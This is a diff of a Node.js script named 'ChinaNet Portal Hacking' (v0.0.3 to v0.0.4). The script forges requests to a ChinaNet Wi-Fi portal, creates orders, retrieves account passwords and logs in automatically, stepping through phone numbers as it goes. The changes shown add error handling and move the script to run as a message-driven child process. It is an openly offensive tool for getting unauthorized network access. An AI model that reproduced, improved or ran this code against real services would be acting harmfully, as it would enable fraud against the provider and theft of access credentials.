@@ -1,5 +1,5 @@
 /*!
- * ChinaNet Portal Hacking v0.0.3 by Dolphin @BUCT_SNC_SYS.
+ * ChinaNet Portal Hacking v0.0.4 by Dolphin @BUCT_SNC_SYS.
  * Copyright 2014 Dolphin Wood.
  * Licensed under http://opensource.org/licenses/MIT
  *
@@ -22,7 +22,7 @@ function colorConsole(str, color) {
     if (!colorful)
         console.log(str);
     else
-        console.log(colorful);
+        console.log(colorful.bold);
 }
 
 function opt(path, cookie) {
@@ -48,11 +48,9 @@ var init = {
             host: 'www.baidu.com',
             path: '/index.html'
         };
-        http.get(options, function(res) {
-            if (callback && typeof(callback) === 'function') {
-                callback(res.statusCode);
-                return false; // 检测网络连接时不用进行下面的步骤
-            }
+        var req = http.get(options, function(res) {
+            if (callback && typeof(callback) === 'function')
+                return callback(res.statusCode); // 检测网络连接时不用进行下面的步骤
             if (res.headers.location) {
                 // 获取到的重定向地址如：https://wlan.ct10000.com/portal/Huawei.redirect?NasName=BJ-JA-SR-1.M.ME60
                 var nasInfo = res.headers.location.split('/portal/')[1];
@@ -66,6 +64,10 @@ var init = {
                 init.NasType = NasType;
                 colorConsole('\n获取到的网关信息：NasType=' + NasType + '\tNasName=' + NasName + '\n', 'cyan');
             }
+        });
+        req.on('error', function(e) {
+            colorConsole('请求出错: ' + e.message, 'red');
+            process.exit();
         });
     },
     open: function() {
@@ -81,7 +83,7 @@ var init = {
             init.addGood(); // 触发 addGood 请求
         });
         req.on('error', function(e) {
-            colorConsole('请求出错: ' + e.message + '\n', 'red');
+            colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
         });
     },
     addGood: function() {
@@ -93,7 +95,7 @@ var init = {
             init.list(); // 触发 list 请求
         });
         req.on('error', function(e) {
-            colorConsole('请求出错: ' + e.message + '\n', 'red');
+            colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
         });
     },
     list: function() {
@@ -105,7 +107,7 @@ var init = {
             hack.getOrder(); // 触发 getOrder 请求
         });
         req.on('error', function(e) {
-            colorConsole('请求出错: ' + e.message + '\n', 'red');
+            colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
         });
     }
 };
@@ -133,9 +135,9 @@ var hack = {
             });
         });
         req.on('error', function(e) {
-            colorConsole('请求出错: ' + e.message + '\n', 'red');
+            colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
         });
-        init.phone++; // 为下次计算做准备
+        process.send(++init.phone); // 为下次计算做准备
     },
     getPwd: function(orderId) {
         // 获取帐密
@@ -160,7 +162,7 @@ var hack = {
             });
         });
         req.on('error', function(e) {
-            colorConsole('请求出错: ' + e.message + '\n', 'red');
+            colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
         });
     },
     hackLogin: function(uname, pwd) {
@@ -225,7 +227,8 @@ var hack = {
             });
         });
         req.on('error', function(e) {
-            colorConsole('服务器连接出错: ' + e.message + '\n', 'red');
+            colorConsole('登录出错: ' + e.message + ',请检查网络连接\n', 'red');
+            process.exit();
         });
         req.write(contents); // 写入请求内容
         req.end();
@@ -252,21 +255,17 @@ var hack = {
     }
 };
 
-(function() {
-    // 从控制台得到输入的手机号
-    colorConsole('/*!\n* ChinaNet Portal Hacking v0.0.3 by Dolphin @BUCT_SNC_SYS.\n* Copyright 2014 Dolphin Wood.\n* Licensed under http://opensource.org/licenses/MIT\n*\n* Designed and built with all the love in the world.\n*\n* Just typing Phone Number in shell to run it;\n* Everything will be done automatically :)\n*/\n\n', 'yellow');
-    process.stdin.resume();
-    process.stdin.setEncoding('utf8');
-    process.stdout.write('请输入11位手机号: ');
-    process.stdin.on('data', function(phone) {
-        phone = phone.trim();
-        if (phone.length !== 11)
-            return colorConsole('手机号长度不对！\n', 'red'), process.stdout.write('请输入11位手机号: ');
-        if (/[^\d]/g.test(phone))
-            return colorConsole('手机号格式不正确！\n', 'red'), process.stdout.write('请输入11位手机号: ');
-        process.stdin.pause();
-        init.phone = parseInt(phone, 10); // 存储手机号码
-        init.tryConnect(); // 异步获得网关信息
-        init.open(); // 开始伪造请求
-    });
-}());
+process.on('message', function(status) {
+    init.phone = status.phone;
+    if (status.crashed) {
+        colorConsole('\n主进程已启动！\n\n开始检测网络连接', 'green');
+        hack.checkDelay();
+    } else {
+        init.tryConnect();
+        init.open();
+    }
+}).on('uncaughtException', function(err) {
+    // 异常抛出
+    colorConsole('Uncaught Exception ' + err, 'red');
+    process.exit();
+});
